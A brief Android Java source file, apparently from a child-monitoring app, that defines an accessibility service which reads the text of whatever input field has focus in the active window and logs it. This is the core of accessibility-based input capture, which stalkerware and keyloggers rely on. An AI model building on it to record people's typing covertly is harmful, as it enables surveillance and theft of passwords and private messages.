package com.kidsguard.child;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;

public class UiAutomationService extends AccessibilityService {
    private static final String TAG = "UiAutomation";

    public void extractCurrentInput() {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        AccessibilityNodeInfo focusedNode = rootNode.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        
        if (focusedNode != null && focusedNode.getText() != null) {
            String text = focusedNode.getText().toString();
            processText(text);
        } else {
            Log.d(TAG, "No input field currently focused");
        }
        
        if (focusedNode != null) focusedNode.recycle();
        rootNode.recycle();
    }

    private void processText(String text) {
        Log.d(TAG, "Processed text: " + text);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {}

    @Override
    public void onInterrupt() {}
}
